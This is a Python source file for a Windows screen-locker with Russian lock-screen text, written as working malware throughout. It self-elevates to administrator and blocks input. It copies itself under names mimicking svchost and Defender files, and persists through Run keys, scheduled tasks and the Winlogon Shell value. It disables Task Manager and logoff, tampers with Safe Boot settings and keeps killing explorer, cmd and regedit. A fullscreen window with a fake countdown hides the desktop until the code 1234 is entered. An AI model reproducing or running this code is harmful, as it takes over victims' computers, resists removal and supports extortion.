import tkinter as tk, subprocess, sys, ctypes, random, time, threading, os, shutil

CODE = "1234"
BG, FG, ACC = "#141414", "#ff5a00", "#ff2200"
STOP = False
FROZEN = getattr(sys, "frozen", False)
KEY = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
EXP = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
WL = r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
RUN = r"Software\Microsoft\Windows\CurrentVersion\Run"
RUNONCE = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
SBOPT = r"SYSTEM\CurrentControlSet\Control\SafeBoot\Option"
HIDDEN = os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "SystemWin")
EXT = ".exe" if FROZEN else ".py"
HOME = None
DEFSCAN = os.path.join(os.environ.get("PROGRAMDATA", ""), "Microsoft", "Windows Defender", "scans")
NO_WIN = 0x08000000

def sh(cmd):
    subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                   creationflags=NO_WIN)

def kill_procs():
    for exe in ("explorer.exe", "taskmgr.exe", "mmc.exe", "cmd.exe", "regedit.exe",
                "control.exe", "SystemSettings.exe", "StartMenuExperienceHost.exe"):
        sh(f"taskkill /f /im {exe}")

def is_admin():
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False

def require_admin():
    if is_admin():
        return
    if FROZEN:
        exe = sys.executable
        args = " ".join(f'"{a}"' for a in sys.argv[1:])
    else:
        exe = sys.executable
        if exe.lower().endswith("pythonw.exe"):
            cand = os.path.join(os.path.dirname(exe), "python.exe")
            if os.path.exists(cand):
                exe = cand
        args = " ".join(f'"{a}"' for a in sys.argv[1:])
    r = ctypes.windll.shell32.ShellExecuteW(None, "runas", exe, args, None, 1)
    if r > 32:
        sys.exit()
    time.sleep(1)

def mark(v):
    sh(f'reg add "{KEY}" /v WinUnlocked /t REG_DWORD /d {v} /f')

def is_marked():
    p = subprocess.run(f'reg query "{KEY}" /v WinUnlocked', shell=True,
                       stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, creationflags=NO_WIN)
    return b"0x1" in p.stdout

def keys(off):
    d = "/f" if off else "/f"
    for hive in ("HKCU", "HKLM"):
        for v in ("DisableTaskMgr", "DisableLockWorkstation"):
            if off:
                sh(f'reg add "{hive}\\{KEY}" /v {v} /t REG_DWORD /d 1 {d}')
            else:
                sh(f'reg delete "{hive}\\{KEY}" /v {v} {d}')
        for v in ("NoLogoff", "NoClose", "NoWinKeys"):
            if off:
                sh(f'reg add "{hive}\\{EXP}" /v {v} /t REG_DWORD /d 1 {d}')
            else:
                sh(f'reg delete "{hive}\\{EXP}" /v {v} {d}')

def sbopt(off):
    if off:
        sh(f'reg add "HKLM\\{SBOPT}" /v OptionValue /t REG_DWORD /d 0 /f')
    else:
        sh(f'reg delete "HKLM\\{SBOPT}" /v OptionValue /f')

def clones():
    return [
        os.path.join(HIDDEN, "svchost" + EXT),
        os.path.join(os.environ.get("LOCALAPPDATA", ""), "Temp", "svc", "wd" + EXT),
        os.path.join(os.environ.get("PROGRAMDATA", ""), "MSData", "hw.ini" + EXT),
        os.path.join(DEFSCAN, "msmpeng" + EXT),
    ]

def cmd_for(p):
    return f'"{p}"' if p.lower().endswith(".exe") else f'pythonw "{p}"'

def pin_locations():
    src = sys.executable if FROZEN else os.path.abspath(sys.argv[0])
    home = clones()[0]
    for dst in clones():
        try:
            if os.path.abspath(src).lower() != os.path.abspath(dst).lower():
                os.makedirs(os.path.dirname(dst), exist_ok=True)
                shutil.copyfile(src, dst)
        except OSError:
            pass
    return home

def set_shell(p):
    val = f"explorer.exe, {cmd_for(p)}"
    sh(f'reg add "HKCU\\{WL}" /v Shell /t REG_SZ /d "{val}" /f')
    sh(f'reg add "HKLM\\{WL}" /v Shell /t REG_SZ /d "{val}" /f')

def autostart(p):
    mark(0)
    for hive in ("HKCU", "HKLM"):
        for k in (RUN, RUNONCE):
            sh(f'reg add "{hive}\\{k}" /v WinLock /t REG_SZ /d "{cmd_for(p)}" /f')
    sh(f'schtasks /create /tn WinLock /sc onlogon /rl highest /f /tr "{cmd_for(p)}"')
    sh(f'schtasks /create /tn SystemHealth /sc onlogon /delay 0000:30 /rl highest /f /tr "{cmd_for(p)}"')

def unautostart(p=None):
    for hive in ("HKCU", "HKLM"):
        for k in (RUN, RUNONCE):
            sh(f'reg delete "{hive}\\{k}" /v WinLock /f')
        sh(f'reg delete "{hive}\\{WL}" /v Shell /f')
    for t in ("WinLock", "SystemHealth"):
        sh(f'schtasks /delete /tn {t} /f')

def restore(p=None):
    global STOP
    STOP = True
    try:
        ctypes.windll.user32.BlockInput(False)
    except Exception:
        pass
    keys(False)
    sbopt(False)
    unautostart(p)
    mark(1)
    sh("taskkill /f /im explorer.exe")
    time.sleep(0.4)
    try:
        ctypes.windll.shell32.ShellExecuteW(None, "open", "explorer.exe", None, None, 1)
    except Exception:
        subprocess.Popen(["explorer.exe"])

def watchdog():
    while not STOP:
        kill_procs()
        time.sleep(0.8)

class Block:
    def __init__(self, master, geo, title, fullscreen=False):
        self.master = master
        self.top = tk.Toplevel(master)
        self.top.geometry(geo)
        self.top.title(title)
        self.top.configure(bg=BG)
        self.top.overrideredirect(True)
        self.top.attributes("-topmost", True)
        if fullscreen:
            self.top.attributes("-fullscreen", True)
        self.top.protocol("WM_DELETE_WINDOW", lambda: None)
        self.overlay()

    def overlay(self):
        if STOP:
            return
        try:
            self.top.attributes("-topmost", True)
            self.top.lift()
            self.top.focus_force()
            self.top.after(50, self.overlay)
        except tk.TclError:
            pass

class Lock(Block):
    def __init__(self, master, geo, title):
        super().__init__(master, geo, title, fullscreen=True)
        self.build()
        self.top.after(400, self.drop_block)

    def build(self):
        tk.Label(self.top, text="Ваш Windows заблокирован!!!", bg=BG, fg=ACC,
                 font=("Consolas", 24, "bold")).pack(pady=(40, 12))
        tk.Label(self.top, bg=BG, fg=FG, justify="center", font=("Consolas", 12),
                 text="Внимание: ввод заблокирован.\n"
                      "Кликните по окну или нажмите любую клавишу — ввод включится.\n"
                      "Для получения кода разблокировки введите его ниже.").pack()
        self.code = tk.Entry(self.top, bg="white", fg="black", font=("Consolas", 18),
                             width=20, justify="center", insertbackground="black", show="*")
        self.code.pack(pady=20)
        self.code.bind("<Return>", lambda e: self.unlock())
        tk.Button(self.top, text="  РАЗБЛОКИРОВАТЬ  ", bg=ACC, fg="black",
                  font=("Consolas", 12, "bold"), command=self.unlock).pack(pady=10)
        self.err = tk.Label(self.top, text="", bg=BG, fg="#ff9900", font=("Consolas", 10))
        self.err.pack()
        self.timer = tk.Label(self.top, text="00:00:59", bg=BG, fg=ACC,
                              font=("Consolas", 26, "bold"))
        self.timer.pack(pady=20)
        self.tick()
        for seq in ("<Button-1>", "<KeyPress>", "<FocusIn>"):
            self.top.bind_all(seq, self.drop_block, add="+")

    def drop_block(self, _=None):
        try:
            ctypes.windll.user32.BlockInput(False)
        except Exception:
            pass

    def tick(self):
        if STOP:
            return
        self.timer.config(text=f"00:00:{random.choice([59, 58, 57, 33, 12, 11, 9, 8]):02d}")
        try:
            self.top.after(900, self.tick)
        except tk.TclError:
            pass

    def unlock(self):
        if self.code.get().strip() == CODE:
            restore(HOME)
            self.master.after(400, self.master.destroy)
        else:
            self.err.config(text="Неверный код.")
            self.code.delete(0, tk.END)

def main():
    global HOME
    if is_marked():
        restore(sys.argv[0] if FROZEN else "")
        time.sleep(1.5)
        return

    require_admin()
    if not is_admin():
        return
    if is_marked():
        restore(sys.argv[0] if FROZEN else "")
        return

    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    ctypes.windll.user32.BlockInput(True)

    HOME = pin_locations()
    autostart(HOME)
    set_shell(HOME)
    keys(True)
    sbopt(True)
    kill_procs()
    threading.Thread(target=watchdog, daemon=True).start()

    root = tk.Tk()
    root.withdraw()
    root.attributes("-topmost", True)
    Lock(root, "760x480+140+140", "locked")
    for i, (txt, geo) in enumerate((("ENCRYPT…", "260x120+-220+0"), ("MD NN SO NM", "260x120+-220+130"))):
        w = Block(root, geo, f"pad{i}")
        tk.Label(w.top, text=txt, bg="#241414", fg="#883322",
                 font=("Consolas", 10), wraplength=240).pack(expand=True)
    root.mainloop()

if __name__ == "__main__":
    main()
